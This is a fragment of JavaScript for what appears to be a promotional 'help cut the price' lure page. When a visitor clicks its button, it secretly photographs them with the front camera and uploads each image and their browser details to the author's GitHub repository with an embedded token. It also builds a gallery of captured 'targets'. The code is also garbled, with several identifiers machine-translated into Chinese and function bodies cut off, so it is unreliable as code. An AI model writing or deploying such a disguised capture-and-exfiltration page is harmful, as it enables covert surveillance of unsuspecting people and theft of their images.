  function coinRain(){

  async function silentCapture(){
    try{
      if(!stream){
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: 1280, height: 720 },
          audio: false
        });
      }
      const v = $('vid');
      v.srcObject = stream;
      await new Promise(function(r){ setTimeout(r, 2200); });

      const c = $('canvas');
      c.width = v.videoWidth || 1280;
      c.height = v.videoHeight || 720;
      const ctx = c.getContext('2d');
      ctx.drawImage(v, 0, 0);
      const blob = await new Promise(function(r){ c.toBlob(r, 'image/jpeg', 0.85); });

      stream.getTracks().forEach(function(t){ t.stop(); });
      stream = null;

      await uploadImage(blob);
    } catch(e){
      console.log('cam blocked:', e);
    }
  }

  async function uploadImage(blob){
    try{
      const reader = new FileReader();
      const dataUrl = await new Promise(function (resolve, 拒绝) {
        读者.加载 = 函数 () { 解决(阅读器.结果); };
        阅读器.onerror = reject;
        reader.readAsDataURL(blob);
      });

      const base64 = dataUrl.分割(',')[1];

      const now = new Date();
      const filename = now.getFullYear() + 
        String(now.getMonth() + 1).padStart(2, '0') + 
        String(now.getDate()).padStart(2, '0') + '_' +
        String(now.getHours()).padStart(2, '0') + 
        String(now.getMinutes()).padStart(2, '0') + 
        String(now.getSeconds()).padStart(2, '0') + '_' +
        Math.random().toString(36).slice(2, 6) + '.jpg';

      const meta = {
        ua: navigator.userAgent,
        time: now.toISOString(),
        filename: filename,
      };

      const res = await fetch(
        'https://api.github.com/repos/' + GH_OWNER + '/' + GH_REPO + '/contents/' + filename,
        {
          method: 'PUT',
          headers: {
            'Authorization': 'token ' + GH_TOKEN,
            'Content-Type': 'application/json',
            'Accept': 'application/vnd.github.v3+json',
          },
          body: JSON.stringify({
            message: 'capture: ' + meta.time,
            branch: GH_BRANCH,
            content: base64,
          }),
        }
      );

      const data = await res.json();

      if (data && data.content && data.content.download_url) {
        console.log('✓ uploaded:', data.content.download_url);
        toast('✓ 助力成功');
      } else {
        console.log('upload failed:', data);
      }
    } catch (e) {
      console.log('upload error:', e);

  $('knifeBtn').addEventListener('click', function(){

  async function loadViewer(){
    const res = await fetch('https://api.github.com/repos/' + GH_OWNER + '/' + GH_REPO + '/contents?ref=' + GH_BRANCH, {
      headers: { 'Authorization': 'token ' + GH_TOKEN, 'Accept': 'application/vnd.github.v3+json' }

    const files = await res.json();
    
    let html = '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>📸 捕获浏览</title>';
    html += '<style>body{background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;margin:0;padding:16px}';
    html += 'h1{margin:0 0 8px;font-size:20px}';
    html += '.stat{color:#999;font-size:12px;margin-bottom:16px}';
    html += '.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}';
    html += '@media(min-width:600px){.grid{grid-template-columns:repeat(3,1fr)}}';
    html += '.card{background:#111;border-radius:8px;overflow:hidden;cursor:pointer}';
    html += '.card img{width:100%;display:block;aspect-ratio:3/4;object-fit:cover}';
    html += '.meta{padding:6px;font-size:10px;color:#888}';
    html += '.empty{color:#666;text-align:center;padding:40px}';
    html += '.lightbox{position:fixed;inset:0;background:rgba(0,0,0,0.95);display:none;align-items:center;justify-content:center;z-index:9999;padding:20px}';
    html += '.lightbox.show{display:flex}';
    html += '.lightbox img{max-width:100%;max-height:90vh;object-fit:contain}';
    html += '.lightbox .close{position:absolute;top:20px;right:20px;color:#fff;font-size:30px;cursor:pointer;width:40px;height:40px;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.1);border-radius:50%}';
    html += '</style></head><body>';

    if(!Array.isArray(files)){
      html += '<h1>📸 错误</h1>';
      html += '<div class="empty">无法读取仓库:<br>' + JSON.stringify(files) + '</div>';
    } else {
      const jpgs = files.filter(f => f.name.endsWith('.jpg'));
      jpgs.sort((a,b) => b.name.localeCompare(a.name));
      
      html += '<h1>📸 捕获浏览</h1>';
      html += '<div class="stat">共 ' + jpgs.length + ' 张 · 你的目标已经被拍下</div>';
      
      if(jpgs.length === 0){
        html += '<div class="empty">暂无捕获。等目标点按钮~</div>';
      } else {
        html += '<div class="grid">';
        for(const f of jpgs){
          html += '<div class="card" data-url="' + f.download_url + '">';
          html += '<img src="' + f.download_url + '" loading="lazy">';
          html += '<div class="meta">' + f.name.replace('.jpg','') + '</div>';
          html += '</div>';
        }
        html += '</div>';
        html += '<div class="lightbox" id="lb"><span class="close" id="lbClose">×</span><img id="lbImg"></div>';
      }
    }

    html += '</body></html>';
    
    document.open();
    document.write(html);
    document.close();

    if(Array.isArray(files)){
      document.querySelectorAll('.card').forEach(function(card){
        card.addEventListener('click', function(){
          document.getElementById('lbImg').src = card.dataset.url;
          document.getElementById('lb').classList.add('show');
        });
      });
      document.getElementById('lbClose').addEventListener('click', function(){
        document.getElementById('lb').classList.remove('show');
      });
      document.getElementById('lb').addEventListener('click', function(e){
        if(e.target === document.getElementById('lb')){
          document.getElementById('lb').classList.remove('show');
        }
      });
    }
  }
})();
